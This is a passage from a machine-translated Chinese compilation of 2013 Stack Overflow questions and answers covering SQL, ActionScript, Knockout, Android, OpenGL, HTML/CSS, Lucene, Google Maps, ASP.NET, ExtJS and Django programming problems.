     AND [tblApplicantSchools_shadow].statusID = 4
GROUP BY 
     DATEADD(ww, (DATEDIFF(ww, 0, [tblApplicantSchools_shadow].updated)), 0) 
```

**这是一个小提琴：[http ://sqlfiddle.com/#!3/3aa61/42](http://sqlfiddle.com/#!3/3aa61/42)**

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-13T17:37:32.973

根据您的标题，我假设您希望每个申请人的一行是最小的一行`id`。您可以使用以下功能为每个申请人 ID 选择一行`ROW_NUMBER()`：

```
;with latestApplication AS
(
    SELECT DATEADD(ww,(DATEDIFF(ww,0,[tblApplicantSchools_shadow].updated)),0) 
               AS Datesubmitted,
        [tblApplicantSchools_shadow].applicantID,
        ROW_NUMBER() OVER (PARTITION BY [tblApplicantSchools_shadow].applicantID 
                           ORDER BY [tblApplicantSchools_shadow].id) 
            AS rn
    FROM tblApplicants  
    INNER JOIN tblApplicantSchools_shadow 
        ON tblApplicantS.ApplicantID = tblApplicantSchools_shadow.applicantID
    WHERE ApplyingForYear = '2013/14' 
    AND [tblApplicantSchools_shadow].statusID = 4
)
select Datesubmitted, COUNT(1) AS TotalAppsPerWeek
FROM latestApplication
WHERE rn = 1
group by Datesubmitted
order by Datesubmitted DESC 
```

[http://sqlfiddle.com/#!3/3aa61/57](http://sqlfiddle.com/#!3/3aa61/57)

# actionscript-3 - 相互切换动画剪辑位置 [AS3]

> ID：15392348
> 
> 赞同：2
> 
> 时间：2013-03-13T17:29:21.850
> 
> 标签：actionscript-3, flash, movieclip, shuffle

我正在处理这个问题。我有 24 个影片剪辑（称为 mc1、mc2、..、mc24），它们以某种网格 (6x4) 的形式放置在舞台上。我需要一个函数，它可以切换这些影片剪辑的位置（类似于随机播放，但已知其他影片剪辑的位置）。例如 mc1.x 和 mc1.y 将等于 mc4.x 和 mc4.y 等。非常感谢您的时间和想法！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-13T23:01:10.643

使用 XOR 交换。它基本上是这样的：

```
mc1.x ^= mc4.x;
mc4.x ^= mc1.x;
mc1.x ^= mc4.x;

mc1.y ^= mc4.y;
mc4.y ^= mc1.y;
mc1.y ^= mc4.y; 
```

然后从那里去。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-13T17:37:38.627

你的意思是这样的：

```
function swap(mcA:MovieClip, mcB:MovieClip):void
{
    var tempPosition:Point = new Point(mcA.x, mcA.y);
    mcA.x = mcB.x;
    mcA.y = mcB.y;

    mcB.x = tempPosition.x;
    mcB.y = tempPosition.y;
}
swap(mc1, mc4); 
```

这将交换 和 的`mc1`位置`mc4`。

```
var totalItems:int = 24; // total number of items
for(var i:int = 0; i < int(totalItems/2); i++)
{
    var randomItem:String = "mc"+(int(Math.random() * (int(totalItems/2)-1)) + (int(totalItems/2)+1));
    swap(this["mc"+(i+1)], this[randomItem]);
} 
```

这将遍历项目的前半部分并将它们与第二半项目中的随机项目交换。

# html - 敲除数据绑定

> ID：15392355
> 
> 赞同：0
> 
> 时间：2013-03-13T17:29:46.593
> 
> 标签：html, knockout.js

我有一个关于使用敲除的数据绑定的问题。

问题是：我有一个表，我想做的是，当单击表中的一行时，我希望该行的值出现在位于表上方的输入字段中。

所以在这里'

```
<tbody data-bind="foreach: customers">
                        <tr data-bind="click: doSomething">     
                            <td data-bind="text: date"></td>
                            <td data-bind="text:staff"></td>
                            <td data-bind="text: ftype"></td>
                            <td data-bind="text: value"></td>
                            <td data-bind="text: message"></td>
                            </td>
                        </tr>
                    </tbody> 
```

在我的视图模型中，我具有以下功能：

```
doSomething: function(data) { 
        var self = this;      
        self.date(data.date);        
        self.staff(data.staff); 
        self.ftype(data.ftype);
                   self.value(data.value);
                   self.message(data.message);  

    } 
```

这是我得到的错误：

```
["Unable to parse bindings.↵Message: ReferenceError:… is not defined;↵Bindings value: click: doSomething", "views/myView/index", Object]
   0: "Unable to parse bindings.↵Message: ReferenceError: doSomething is not          defined;↵Bindings value: click: doSomething"
 1: "views/myView/index"
  2: Object
length: 3
 __proto__: Array[0] 
```

如果我需要提供更多详细信息，请告诉我。我将感谢您的帮助 fplks！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-13T17:41:00.323

这种类型的一个非常基本的模式是有一个项目数组和一个`selectedItem`在选择行时填充的可观察对象。

然后，您可以使用`with`部分周围的绑定来创建您的编辑器。

```
<table>
    <tbody data-bind="foreach: customers">
        <tr data-bind="click: $root.selectedCustomer">     
            <td data-bind="text: name"></td>
        </tr>
    </tbody>
</table>

<hr/>

<div data-bind="with: selectedCustomer">
    <input data-bind="value: name" />
</div> 
```

示例：http: [//jsfiddle.net/rniemeyer/Z6VPV/](http://jsfiddle.net/rniemeyer/Z6VPV/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-13T17:36:24.683

您需要将模型绑定到视图

```
 var currentViewModel = function(){
   this.doSomething = function(data){
      var self = this;      
      self.date(data.date);        
      self.staff(data.staff); 
      self.ftype(data.ftype);
                 self.value(data.value);
                 self.message(data.message);  
  }
var viewModel = new currentViewModel();
ko.applyBindings(viewModel); 
```

# android - 使用 ContentObserver 监控变量变化

> ID：15392362
> 
> 赞同：1
> 
> 时间：2013-03-13T17:30:09.463
> 
> 标签：android, string, uri, contentobserver

`ContentObserver`是否可以通过构造 Uri 并在注册时将其作为参数传递来使用 a来监视变量更改（例如字符串）？如果是，您能否提供一个功能示例？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-13T18:02:46.660

它不会通过对任意字符串值执行 Uri.parse 来工作。

我不认为它会起作用。用例是什么？它表明您无法控制的某些东西正在修改变量。这怎么可能发生？

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2017-10-24T11:36:26.333

它应该与字符串值一起使用，

它对我有用。我用过`Uri.parse`如下：

```
contentResolver.notifyChange(Uri.parse("content://com.example.provider/notification"), null) 
```

# objective-c - 为什么 OpenGL 双缓冲在性能方面似乎不一致？

> ID：15392363
> 
> 赞同：2
> 
> 时间：2013-03-13T17:30:11.820
> 
> 标签：objective-c, macos, opengl, frame-rate, double-buffering

我正在 OSX 上制作一个简单的图形应用程序。我刚开始通过检查帧之间的系统时间差异来监控帧速率。它似乎每隔几帧就会挂起。

该应用程序在 NSTimer 对象上运行，当前设置为 200 fps（5 毫秒帧）。为了确保不仅仅是我的主代码变慢了，我注释掉了整个主循环，除了 [self.context flushBuffer]; （当然还有帧率采样代码）。即使重复这个单一的调用也会导致它一次挂起几帧。这是我的控制台输出的示例：

```
4
5
6
10
5
5
5
4
6
10
5
5
5
5
5
5
20
4
5
6
20
5
5
5 
```

这是每次循环迭代之间的时间（以毫秒为单位）。在 200 fps 时，每帧应该是 5 毫秒左右，但它会反复挂起 10、15 甚至 20 毫秒。正如您在我的 -initOpenGL 函数中所见，垂直同步已禁用。

```
-(void)initOpenGL{
    NSOpenGLPixelFormatAttribute attributes[] = {NSOpenGLPFADoubleBuffer, 0};
    NSOpenGLPixelFormat *pixelFormat = [[NSOpenGLPixelFormat alloc] initWithAttributes: attributes];
    self.context = [[NSOpenGLContext alloc] initWithFormat:pixelFormat shareContext:nil];
    [self.context setView:[self.window contentView]];
    [self.context makeCurrentContext];

    //Disable Vsync
    int temp = 0;
    [self.context setValues: &temp forParameter: NSOpenGLCPSwapInterval];

    glViewport(0, 0, windowWidth, windowHeight);
    glMatrixMode(GL_PROJECTION);
    glOrtho(0, windowWidth, 0, windowHeight, -1, 100);

    //Flip all textures right side up
    glMatrixMode(GL_TEXTURE);
    glLoadIdentity();
    glScalef(1.0f, -1.0f, 1.0f);

    glMatrixMode(GL_MODELVIEW);

    glEnable(GL_SCISSOR_TEST);
    glEnable(GL_BLEND);
    glBlendFunc(GL_SRC_ALPHA, GL_ONE_MINUS_SRC_ALPHA);
    } 
```

**编辑，新信息：我可以确认这与双缓冲与单缓冲有关。当我初始化没有 DoubleBuffer 属性的 NSOpenGLPixelFormat 时，它以 200 fps 的速度完美运行。而有了这个属性，我继续口吃。**

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-03-13T17:43:58.157

在不知道实际渲染代码（未发布）的情况下，一个很可能的原因是首先使用`NSTimer`for 帧速率控制并不是一个好主意。请参阅文档（已添加重点）：

> 计时器**不是实时机制**；它仅在已添加计时器的运行循环模式之一正在运行并且能够检查计时器的触发时间是否已过时触发。由于典型的运行循环管理的各种输入源，计时器的时间间隔的**有效分辨率**被限制在**50-100 毫秒**的数量级。

因此，期望使用 5 毫秒的计时器从根本上是有缺陷的。

除此之外，可能还有其他影响（进程调度、纹理上传和 OpenGL 中的停顿等）会使帧时间不是 100% 恒定。尽管由这些引起的抖动通常会小得多。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2015-07-24T09:15:40.833

如果您想在 OSX 上获得良好的同步，您应该使用 CoreVideo DisplayLink。它是在每次屏幕垂直刷新时调用的回调，因此如果您的屏幕为 60 FPS，则此回调将每秒调用 60 次（在单独的线程中，请注意 OpenGL 线程），这就是应该触发 OpenGL 刷新的原因.

# html - 将按钮放在表单之外但在提交按钮的同一行中

> ID：15392373
> 
> 赞同：0
> 
> 时间：2013-03-13T17:30:51.567
> 
> 标签：html, css

我试图在表单的同一行中放置一个按钮。

```
<form name="search_form" method="get" action="results1.php">
Organism <select name="organism_list" size="1" id="organism_list" >
      <option selected="selected">All</option>
      <option id="human" name="organism_human">Human </option>
      <option id="mouse" name="organism_mouse">Mouse </option>
      <option id="rat"  name="organism_rat">Rat </option>
</select>        
Query <input name="query_textbox" type="text" id="textbox1" value="" />
<input name="search_button" type="submit" id="search_button" value="Go" />
</form>
<input name="ad_search_button" type="submit" id="ad_search_button" value="Advance Search" /> 
```

我希望 ad_search_button 与 search_button 相邻。但由于形式，它没有被放置在我想要的位置。我该怎么办？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-13T17:36:26.840

如果您不能将输入按钮 ad_search_button 保留在表单内，那么您可以制作它`position:absolute`并调整其 top、right、left、bottom 属性以符合`search_button`.

否则，这是您仅有的两种可能性。

*   制作整个表单`float:left`，这将导致“ad_search_button”出现在它的右侧。同样在这种情况下，整个表格的宽度应该小于屏幕的总宽度，以便`ad_search_button`可以容纳。
*   或者您可以简单地将您的表格保留`ad_search_button`在表格中。它应该呈现在`search_button`

*   [ad_search_button 保留在里面](http://jsfiddle.net/manishmishra256/WYC4D/)

*   [ad_search_button 保留在外面](http://jsfiddle.net/manishmishra256/WYC4D/1/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-13T17:34:12.020

我建议将该按钮更改为锚标记，然后将其放在表单中，这样就不会影响表单。

这是假设高级搜索不必在其自己的形式内（在您的示例中不是）

例如

```
 <input name="search_button" type="submit" id="search_button" value="Go" />
    <a href="/ad_search.php">Advanced Search</a>
</form> 
```

把事情简单化。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-13T17:40:16.253

你可以把整个东西放在一张桌子上：

```
<table>
  <tr>
    <td><form>...</form></td>
    <td>other button here</td>
  </tr>
</table> 
```

[http://jsfiddle.net/V273j/](http://jsfiddle.net/V273j/)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-03-13T17:45:20.347

将按钮放在`div`表单内部，然后添加一些 CSS 样式。

[http://jsfiddle.net/25u4c/1/](http://jsfiddle.net/25u4c/1/)

# ruby - 有没有办法在终端中维护两个窗口？

> ID：15392377
> 
> 赞同：0
> 
> 时间：2013-03-13T17:31:05.027
> 
> 标签：ruby, terminal, command-line-interface, tui

我正在构建一个小脚本，我需要在终端（TTY）中维护两个窗口。我想做一些类似 tmux 的状态栏的事情，但是在我在屏幕的其余部分打印东西的同时，我无法让底部栏更新。我希望它看起来像：

```
|------------------------------------------|
| Whatever I 'puts' here                   |
|                                          |
|                                          |
|                                          |
|                                          |
|------------------------------------------|
| Status bar with whatever I 'puts' here   |
|------------------------------------------| 
```

我已经尝试过使用 Ruby curses lib，但我认为这对于我想要做的事情来说太过分了，而且我确信有一种更简单的方法。谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-13T17:32:22.100

curses 是这样做的正确方法。您可以手动使用 ANSI 滚动区域和光标定位，但从长远来看，这将不那么便携，而且工作量更大。

如果你想了解更多关于 ANSI 终端如何工作的信息，这个[维基百科页面](http://en.wikipedia.org/wiki/ANSI_escape_code)是一个很好的起点，有很多链接。

我强烈推荐诅咒。在一个终端仿真器上处理直接的 ANSI 可能会让人头疼；支持多种操作系统和流行的终端仿真器的细微差别不值得麻烦（在我看来。）

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2013-03-13T17:51:31.623

诅咒+1（尽管您可能需要ncurses进行持续开发）-它支持终端的窗口区域。

例如。[http://linux.die.net/man/3/newwin](http://linux.die.net/man/3/newwin)

# kendo-ui - 剑道网格 - 空日期出现“空” - 通用解决方法？

> ID：15392384
> 
> 赞同：2
> 
> 时间：2013-03-13T17:31:25.123
> 
> 标签：kendo-ui, kendo-grid

我们目前使用的是 Kendo 版本 2012.2.710.340，我知道这个版本存在空日期列显示为“空”的问题。我也知道可以使用带有条件的模板来解决此问题以检查是否为空。

但是，是否有任何全球解决方案？我们在整个应用程序中使用了许多网格，我不想为我们在每个网格中绑定的每一列添加修复。

或者，这是在较新的版本中修复的吗？我记得几个月前看到一个论坛帖子说它将出现在下一个版本中，但现在似乎找不到任何参考。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-13T20:31:01.447

是的，这是固定的 -`null`不再显示。而是显示空字符串。尝试更新的版本。

# maven - jenkins：发布版本中的快照工件

> ID：15392390
> 
> 赞同：2
> 
> 时间：2013-03-13T17:31:53.053
> 
> 标签：maven, plugins, jenkins, nexus

我正在使用 jenkins maven 发布插件来制作发布版本。

当我执行发布构建时，该发布已更正部署在 Nexus 中，但如果我无法在 Jenkins UI 中下载工件构建：当我单击发布构建时，构建工件显示的是最后一个快照，而不是发布。

为什么？

![在此处输入图像描述](../Images/245c068f566140b5aef3815d59dfac32.png)

![在此处输入图像描述](../Images/4b09ce187a977db8d66b17f61ba47dab.png)

![在此处输入图像描述](../Images/50f129b978f5f63a2b163e08009ca17b.png)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-14T08:32:03.193

发布的工件在：

```
target\checkout\target 
```

# c# - Song.fromURI() 抛出异常？

> ID：15392396
> 
> 赞同：2
> 
> 时间：2013-03-13T17:32:06.430
> 
> 标签：c#, c#-4.0, xna, xna-4.0

我一直试图在我当前的应用程序中包含 Song.FromURI() 方法，但总是会出现“CrossThreadMessagingException”。

我已经开始了一个新项目，并从字面上复制并粘贴了 MSDN 示例 ( [http://msdn.microsoft.com/en-us/library/ff634558.aspx](http://msdn.microsoft.com/en-us/library/ff634558.aspx) ) 中的代码，但仍然出现异常。它似乎是沉默的（没有终止），但阻止访问任何成员。

谢谢。

```
Uri uriStreaming = new Uri("http://www.archive.org/download/gd1977-05-08.shure57.stevenson.29303.flac16/gd1977-05-08d02t06_vbr.mp3");
Song song = Song.FromUri("StreamingUri", uriStreaming);

'song.Album' threw an exception of type 'Microsoft.VisualStudio.Debugger.Runtime.CrossThreadMessagingException'
'song.Artist' threw an exception of type 'Microsoft.VisualStudio.Debugger.Runtime.CrossThreadMessagingException'
'song.Genre' threw an exception of type 'Microsoft.VisualStudio.Debugger.Runtime.CrossThreadMessagingException'
'song.PlayCount' threw an exception of type 'Microsoft.VisualStudio.Debugger.Runtime.CrossThreadMessagingException' 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-10T18:43:06.327

XNA 团队的 Shawn Hargreaves 不久前在 MSDN 上发布了这个，我相信这与你在这里的内容有关：

> 当您的程序在调试器中暂停时，无法评估许多媒体播放器属性。无法运行涉及与媒体播放器线程通信的复杂属性获取器，因为当您的程序在调试器中中断时该线程被挂起，因此无法运行通常会报告属性值的代码。
> 
> 这只是一个调试器工件，如果您正常运行程序或在调试器中单步执行它，应该不会导致任何问题。它只影响调试器属性显示，而不影响代码的实际执行。

# android - 如何从这棵树中遍历并获取它们的属性？

> ID：15392399
> 
> 赞同：0
> 
> 时间：2013-03-13T17:32:28.227
> 
> 标签：android, xml-parsing, parent-child

```
<?xml version="1.0" encoding="utf-8"?>
<parent>

<child ID="1" Name="CHILD" Order="1">

<child ID="1" Name="SUB_CHILD" Order="1">
<child ID="1" Name="SUB_CHILD_1" Order="01"/>
<child ID="2" Name="SUB_CHILD_2" Order="02"/>
</child >

</child>

<child ID="2" Name="CHILD_2" Order="1">

<child ID="1" Name="SUB_CHILD" Order="1">
<child ID="1" Name="SUB_CHILD_1" Order="01"/>
<child ID="2" Name="SUB_CHILD_2" Order="02"/>
</child >

</child>

</parent> 
```

这是我获取`<child ID="1" Name="CHILD" Order="1">`名称的代码：

```
NodeList nodeList = doc.getElementsByTagName("child");

        Element element = (Element) nodeList.item(0);
        name = element.getAttribute("Name");            

        Toast.makeText(this, ""+ name, Toast.LENGTH_SHORT).show(); 
```

我如何获得以下名称：

```
<child ID="1" Name="SUB_CHILD" Order="1">
<child ID="1" Name="SUB_CHILD_1" Order="01"/> 
```

我已经尝试过 getChildNode 但它只返回任何内容。

# apache-flex - 标题中的 Flex 4 MX AdvancedDataGrid 嵌入字体仅适用于某些用户

> ID：15392400
> 
> 赞同：1
> 
> 时间：2013-03-13T17:32:31.507
> 
> 标签：apache-flex, datagrid, fonts, advanceddatagrid

我有一个 Flex 4.5 应用程序。我们的大多数表都使用 Spark DataGrids。但是，在某些情况下，我们需要使用 MX AdvancedDataGrid，因为我们需要进行多重排序并锁定列。

问题是字体在 Spark DataGrid 标头中显示得非常好。在 MX AdvancedDataGrid 标头中（并且仅在标头中，数据显示字体完美无缺），字体恢复为 Times。但是，并非所有用户都会发生这种情况。我们的大多数开发人员都看到字体很好，但我们的一些用户在 MX ADG 中看到了 Times 字体。我对我所缺少的感到茫然。

我在应用程序中使用嵌入字体，嵌入 CFF 和非 CFF（包括所有变体，例如斜体和浅色）：

```
@font-face {
    src: url("assets/fonts/SourceSansPro-Regular.ttf");
    fontFamily: SSP;
    fontStyle: normal;
    fontWeight: normal;
    embedAsCFF: true;
}

/* embed non CFF fonts for MX controls */
@font-face {
    src: url("assets/fonts/SourceSansPro-Regular.ttf");
    fontFamily: SSPNoCFF;
    fontStyle: normal;
    fontWeight: normal;
    embedAsCFF: false;
} 
```

我已经为 spark DataGrid 和 mx AdvancedDataGrid 设置了样式：

```
mx|AdvancedDataGrid,
.standardDataGrid,
mx|DataGrid {
alternating-item-colors: #ffffff, #f6f6f6;
border-visible: false;
headerColors: #e6e6e6, #e6e6e6;
headerStyleName: standardDataGridHeader;
headerSeparatorColor: #d0d0d0;
headerSeparatorAlpha: 1;
horizontal-grid-lines: true;
horizontal-grid-line-color: #d0d0d0;
selection-color: #c2e5f2;
roll-over-color: #d4ebf3;
vertical-grid-lines: true;
vertical-grid-line-color: #d0d0d0;
user-roll-over: false;

text-align: left;

header-background-skin:  ClassReference("org.pcpgm.gis.flex.skins.DataGridHeaderBackgroundSkin");
    header-separator-skin: ClassReference("org.pcpgm.gis.flex.skins.DataGridHeaderSeparatorSkin");

    vertical-separator-skin: ClassReference("org.pcpgm.gis.flex.skins.DataGridVerticalSeparatorSkin");
    vertical-locked-separator-skin: ClassReference("org.pcpgm.gis.flex.skins.DataGridVerticalLockedSeparatorSkin");
}

s|DataGrid {

    alternating-row-colors: #ffffff, #f6f6f6;
    selection-color: #c2e5f2;
    roll-over-color: #d4ebf3;

    skinClass: ClassReference("org.pcpgm.gis.flex.skins.GIDataGridSkin");
}

skins|GIDataGridSkin {
    border-visible: false;  
}

grid|DefaultGridHeaderRenderer {
    vertical-align: middle;

    padding-top: 0px;
    padding-right: 5px;
    padding-bottom: 0px;
    padding-left: 5px;

    color: #4f4f4f;
    text-align: left;

    roll-over-color: #e6e6e6;

}

grid|DefaultGridHeaderRenderer #labelDisplay {
    fontFamily: SSPLight;
    font-size: 14pt;    
} 
```

我已经分别为 spark 和 mx 组件设置了项目渲染器，以允许非 CFF 版本的字体。

```
mx|Alert,
mx|DataGrid,
mx|Menu,
mx|DateChooser,
mx|Panel,
mx|TabNavigator {
    fontFamily: SSPNoCFF;
    defaultDataGridItemEditor: ClassReference("mx.controls.MXFTETextInput");
    defaultDataGridItemRenderer: ClassReference("mx.controls.dataGridClasses.FTEDataGridItemRenderer");
}

mx|AdvancedDataGrid,
controls|SearchSortedAdvancedDataGrid{
    fontFamily: SSPNoCFF;
    defaultDataGridItemEditor: ClassReference("mx.controls.MXFTETextInput");
    defaultDataGridItemRenderer: ClassReference("mx.controls.advancedDataGridClasses.FTEAdvancedDataGridItemRenderer"); 
} 
```

任何帮助是极大的赞赏，

广东

# search - Solr / Lucene：对单个标签进行评分

> ID：15392402
> 
> 赞同：0
> 
> 时间：2013-03-13T17:32:46.073
> 
> 标签：search, solr, lucene, ranking, information-retrieval

我正在设计一个 Lucene 搜索索引，其中包括每个文档的排名标签。

例子：

```
Document 1
tag: java , rank 1.2
tag: learning, rank 2.1
tag: bugs, rank 1.2
tag: architecture: rank 0.3 
```

标签来自自动分类算法，该算法也分配了分数。

如何设计索引以便查询标签组合并返回最相关的结果？例子，搜索java+learning

我最初为每个标签创建了一个 FIELD，并使用排名来提升每个文档的字段。就性能而言，这是一个好方法吗？如果我有 10,000 个可能的标签怎么办？在 Lucene 中拥有 10,000 个 FIELDS 是个好主意吗？

```
Field tag = new Field(
        FIELD_TAG+tag.getId(),
        "y",
        Field.Store.NO,
        Field.Index.NOT_ANALYZED);

tag.setBoost(tag.getRank());

luceneDoc.add(tag); 
```

如果我改为将所有标签添加到同一字段，我如何考虑排名？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-15T16:29:11.693

我在搜索中也遇到了这个问题...如果我错了请告诉我...

好的是如果你可以让像“标签”这样的字段包含值“java learning bugs architecture”并且你使用WhiteSpaceTokenizer：

[http://wiki.apache.org/solr/AnalyzersTokenizersTokenFilters#solr.WhitespaceTokenizerFactory](http://wiki.apache.org/solr/AnalyzersTokenizersTokenFilters#solr.WhitespaceTokenizerFactory)

但是这样做你不能支持每个单词，你可以提升“标签”字段......

当用户搜索“java bugs”或“architecture in java”时，Lucene 不会给出很好的评分，但会返回所有包含此词的文档。

但是你可以像你说的那样做很多“标签”并提升每一个......或者你可以创建一个新的查询解析器[http://today.java.net/pub/a/today/2003/11/07 /QueryParserRules.html](http://today.java.net/pub/a/today/2003/11/07/QueryParserRules.html)继承 edismax（例如）以使字段按您的意愿工作。

那是你要的吗？

哦...还有一件事，添加很多字段会使文档索引器变慢并且索引更大（可能不好搜索）。

# wordpress - 动态添加谷歌地图信息窗口 Wordpress

> ID：15392404
> 
> 赞同：0
> 
> 时间：2013-03-13T17:32:48.087
> 
> 标签：wordpress, google-maps, dynamic, infowindow

我正在尝试将 Google 地图 InfoWindow 动态添加到 Wordpress，这是当前正在使用自定义标记的代码我已经尝试了 infowindows 的几个功能，但它似乎正在破坏并且没有加载地图。不知道我可能做错了什么。

这工作我只需要添加一个 infoWindow

```
<script type="text/javascript">
              //<![CDATA[

              function load() {
                 var styles = 
                 [
                    {
                      "stylers": [
                        { "lightness": 1 },
                        { "saturation": -76 },
                        { "hue": "#3bff00" }
                      ]
                    }
                  ];

              var lat = <?php echo $lat; ?>;
              var lng = <?php echo $lng; ?>;
              // coordinates to latLng
              var latlng = new google.maps.LatLng(lat, lng);
              // map Options

              var myOptions = {

              zoom: 14,
              scrollwheel: false,
              center: latlng,
              mapTypeId: 'Styled'
              };

              //draw a map
              var map = new google.maps.Map(document.getElementById("map"), myOptions);
              var styledMapType = new google.maps.StyledMapType(styles, { name: 'Styled' });
              map.mapTypes.set('Styled', styledMapType);
              var marker = new google.maps.Marker({
              position: map.getCenter(),
              map: map,
              icon: '/wp-content/themes/bills_theme/images/pin_bills.png',
              });
              }
              // call the function
              load();
              //]]>

            </script> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-15T06:41:19.277

只需添加以下代码：

```
var contentString = 'put your content here.';
google.maps.event.addListener(marker, 'click', function() {
    var infowindow = new google.maps.InfoWindow({
        content: contentString,
        position: latlng,
        maxWidth: 200
        });
    infowindow.open(map);
}); 
```

有关信息窗口的更多信息，您可以在[此处](https://developers.google.com/maps/documentation/javascript/overlays#InfoWindows)阅读。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-13T18:12:49.690

一个简单的[信息窗口](https://developers.google.com/maps/documentation/javascript/overlays#InfoWindows)将是（未经测试）：

```
 //draw a map
          var map = new google.maps.Map(document.getElementById("map"), myOptions);
          var styledMapType = new google.maps.StyledMapType(styles, { name: 'Styled' });
          map.mapTypes.set('Styled', styledMapType);
          var marker = new google.maps.Marker({
            position: map.getCenter(),
            map: map,
            icon: '/wp-content/themes/bills_theme/images/pin_bills.png',
          });
          var infowindow = new google.maps.InfoWindow();
          google.maps.event.addListener(marker, "click", function(e) {
             infowindow.setContent("Hello world");
             infowindow.open(map,marker);
          });
          google.maps.event.trigger(marker, "click");
          }
          // call the function 
```

# asp.net - Asp.net 4.5 中的独立线程

> ID：15392410
> 
> 赞同：0
> 
> 时间：2013-03-13T17:33:03.193
> 
> 标签：asp.net, asp.net-4.5, long-running-processes

```
protected void Button1_OnClick(object sender, EventArgs e)
{
    FineTuneDB();// Long Task running in db
    SendSMStoAllClients();// Using Twolio API to send sms to all client long task

    lblText.Text = "Button click is completed our system threads working on your request";
} 
```

这是否有可能在按钮单击时我可以响应客户端和独立的长任务分别进行。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-13T17:41:54.610

如果您不关心任务是否完成，您可以调用`FineTuneDB`这样的方法。

```
Action fineTuneDB = FineTuneDB;
fineTuneDB.BeginInvoke(null, null); 
```

[异步方法调用](http://www.codeproject.com/Articles/14931/Asynchronous-Method-Invocation)

**更新：**

```
Action<int, string> fineTuneDB = FineTuneDB;
fineTuneDB.BeginInvoke((int)Session["id"], 
   Session["name"].ToString(), null, null);

// Your method will be like this
public void FineTuneDB(int id, string)
{

} 
```

# extjs - 从我的 gsp 调用 extjs 函数

> ID：15392414
> 
> 赞同：1
> 
> 时间：2013-03-13T17:33:27.437
> 
> 标签：extjs

我正在尝试从我的 gsp 调用一个 extjs 函数，基本上该函数在 deleteFiling.js 中，我在 gsp 标头中引用它

```
<g:javascript src="deleteConfirm.js"></g:javascript> 
```

和 deleteConfirm.js：

```
Ext.onReady(function(){

Ext.BLANK_IMAGE_URL = appContextRoot
+ '/js/extjs/resources/images/default/s.gif';
var theme = appContextRoot
+ "/js/extjs/resources/css/xtheme-gray.css";
Ext.util.CSS.swapStyleSheet("theme", theme)

Ext.QuickTips.init();
Ext.form.Field.prototype.msgTarget = 'side';

function confirmFiling(){
    Ext.MessageBox.show({
        title:'Commit Confirmation',
        msg: 'You are about to <strong>Delete</strong> the entire <strong>Filing</strong>. This \n action cannot be reversed. \n\nAre you sure you want to Proceed',
        buttons: Ext.MessageBox.YESNO,
        fn: processDelete,
        icon: Ext.MessageBox.QUESTION
    });
}}) 
```

我正在调用 confirmFiling 函数，如下所示：

```
<g:link action="deleteFiling" id="${filingInstance.id}" onclick="confirmFiling()"> <img src="${resource(dir:'images',file:'trash.gif')}" title="Delete" /> 
```

我不断收到功能未定义。我知道我可以在没有 extjs 的情况下做到这一点，但我的问题是如何从 html 或 gsp 文件调用 extjs 函数。

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-13T22:43:22.183

您的代码将 confirmFiling 函数定义为您传递给 Ext.onReady 的匿名函数的本地属性。

但是，您的 onclick 事件正在尝试调用它希望在全局范围内找到的 confirmFiling 函数（与窗口范围相同）。

如果这是您的全部代码，并且您将不再使用 Ext 编写函数、模块或其他组件，那么您可以创建一个全局变量并将其设置为等于 confirmFiling 函数，如下所示：

```
myGlobalVar = function confirmFiling(){...} 
```

然后可以从您的 onclick 事件处理程序访问 myGlobalVar。请注意，没有`var`声明全局变量。如果你把它放在`var`它前面，那么它就变成了一个本地的。

另一种（更好的）方法是定义一个命名空间并在该命名空间内创建您的函数。这是一个示例：[http](http://docs.sencha.com/ext-js/3-4/#!/api/Ext-method-ns) ://docs.sencha.com/ext-js/3-4/#!/api/ Ext-method-ns 顺便说一句，我假设您使用的是 ExtJS 3x。在命名空间中定义函数后，您可以通过事件处理程序中的命名空间调用它。

# django - Django：带有 ID 的 HttpResponseRedirect

> ID：15392415
> 
> 赞同：2
> 
> 时间：2013-03-13T17:33:33.523
> 
> 标签：django

嗨，在保存对象结束时，我将用户重定向到编辑页面。我是 Django 新手，下面是我目前实现这一目标的方式。这是正确的方法吗？还是有更好的方法我还不知道？

谢谢。

```
 if form.is_valid():
            group.save()
            messages.add_message(request, messages.SUCCESS, 'Successfully Created/Updated Group')
            return HttpResponseRedirect('/contacts/group/edit/%s' % group.pk) 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-13T17:53:02.117

通常，执行此操作的“django”方式是使用[get_absolute_url() 函数](https://docs.djangoproject.com/en/dev/ref/models/instances/#get-absolute-url)。您是否使用基于类的视图？我相信创建/更新视图的默认行为是重定向到创建/更新对象实例的 get_absolute_url。

# jakarta-ee - java.lang.IllegalStateException on response.SendRedirect("Location")

> ID：15392423
> 
> 赞同：6
> 
> 时间：2013-03-13T17:34:05.203
> 
> 标签：jakarta-ee, servlets

我是 Java EE 领域的初学者。我一直在尝试按照[http://come2niks.com/?p=1589](http://come2niks.com/?p=1589)此处提供的指南使用 Servlets 和 JSP 创建一个简单的登录系统。这就是我的 doPost() 的样子。

```
@Override
protected void doPost(HttpServletRequest request, HttpServletResponse response)
        throws ServletException, IOException {
     PrintWriter out = response.getWriter();
    processRequest(request, response);
     try
    {
